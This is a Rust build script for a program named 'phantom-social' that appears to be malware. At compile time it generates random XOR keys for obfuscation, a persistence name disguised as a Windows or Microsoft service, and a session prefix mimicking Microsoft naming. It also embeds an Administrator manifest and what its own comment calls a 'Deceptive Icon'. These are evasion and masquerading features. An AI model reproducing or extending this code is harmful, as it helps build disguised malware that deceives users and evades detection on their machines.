﻿use std::env;
use std::fs::File;
use std::io::Write;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("generated.rs");
    let mut f = File::create(&dest_path).unwrap();

    let xor_keys: Vec<String> = (0..16)
        .map(|_| format!("0x{:02X}", rand::random::<u8>()))
        .collect();

    let prefixes = ["Windows", "Microsoft", "System", "Security", "Update"];
    let suffixes = ["Service", "Monitor", "Health", "Manager", "Helper", "Assistant"];
    let persist_name = format!(
        "{}{}{}",
        prefixes[rand::random::<usize>() % prefixes.len()],
        suffixes[rand::random::<usize>() % suffixes.len()],
        rand::random::<u16>() % 1000
    );

    let session_prefix = format!("MS{:X}", rand::random::<u32>());

    // FIXED: Adjusted indentation to prevent "lines skipped" warnings
    write!(
        f,
        "// Auto-generated - DO NOT EDIT\n\
const XOR_KEYS: [u8; 16] = [{}];\n\
const PERSIST_NAME: &str = \"{}\";\n\
const SESSION_PREFIX: &str = \"{}\";\n",
        xor_keys.join(", "),
        persist_name,
        session_prefix
    )
    .unwrap();

    println!("cargo:rerun-if-changed=build.rs");

    // 1. Embed the Windows manifest (Administrator/Invoker permissions)
    if cfg!(target_os = "windows") {
        embed_manifest::embed_manifest_file("phantom-social.exe.manifest")
            .expect("Failed to embed manifest");
            
        println!("cargo:rerun-if-changed=phantom-social.exe.manifest");
    }

    // 2. Embed the Deceptive Icon (Visible in File Explorer)
    // This requires 'icon.ico' to be present in the project root
    if cfg!(target_os = "windows") {
        let mut res = winres::WindowsResource::new();
        // This sets the icon for the .exe file itself
        res.set_icon("icon.ico");
        res.compile().expect("Failed to compile winres (missing icon.ico?)");
        
        println!("cargo:rerun-if-changed=icon.ico");
    }
}

